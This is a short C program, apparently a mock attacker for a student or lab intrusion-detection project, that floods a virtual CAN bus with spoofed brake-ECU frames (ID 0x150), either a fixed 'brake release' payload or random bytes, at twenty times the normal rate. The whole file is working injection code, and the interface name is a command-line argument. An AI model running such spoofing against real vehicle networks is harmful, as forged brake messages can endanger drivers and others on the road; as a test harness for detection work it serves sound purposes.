/*
 * attacker.c - CAN-Sentinel Week 2: MOCK attacker (lab use on vcan0 only)
 *
 * Floods the virtual CAN bus with spoofed "Brake" frames (ID 0x150)
 * at a much higher rate than the real brake ECU (which sends every 20 ms).
 * The payload is random-looking to raise packet entropy.
 *
 * Build:  gcc -O2 -Wall -o attacker attacker.c
 * Run:    ./attacker vcan0 [interval_us] [duration_sec] [mode]
 *           interval_us  default 1000 (1 ms = 20x faster than real ECU)
 *           duration_sec default 10
 *           mode         0 = fixed payload FF (spoof "brake release")
 *                        1 = random payload (high entropy)   [default]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

int main(int argc, char **argv)
{
    const char *ifname = (argc > 1) ? argv[1] : "vcan0";
    long interval_us   = (argc > 2) ? atol(argv[2]) : 1000;
    int  duration_sec  = (argc > 3) ? atoi(argv[3]) : 10;
    int  mode          = (argc > 4) ? atoi(argv[4]) : 1;

    int s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl"); return 1; }

    struct sockaddr_can addr;
    memset(&addr, 0, sizeof(addr));
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) { perror("bind"); return 1; }

    srand(time(NULL));
    printf("[ATTACKER] spoofing ID 0x150 on %s every %ld us for %d s (mode %d)\n",
           ifname, interval_us, duration_sec, mode);

    time_t end = time(NULL) + duration_sec;
    unsigned long count = 0;

    while (time(NULL) < end) {
        struct can_frame f;
        memset(&f, 0, sizeof(f));
        f.can_id  = 0x150;          /* same ID as the real brake ECU -> spoofing */
        f.can_dlc = 8;
        if (mode == 0) {
            memset(f.data, 0xFF, 8);
        } else {
            for (int i = 0; i < 8; i++) f.data[i] = rand() & 0xFF;
        }
        if (write(s, &f, sizeof(f)) == sizeof(f)) count++;
        usleep(interval_us);
    }

    printf("[ATTACKER] done, injected %lu frames\n", count);
    close(s);
    return 0;
}
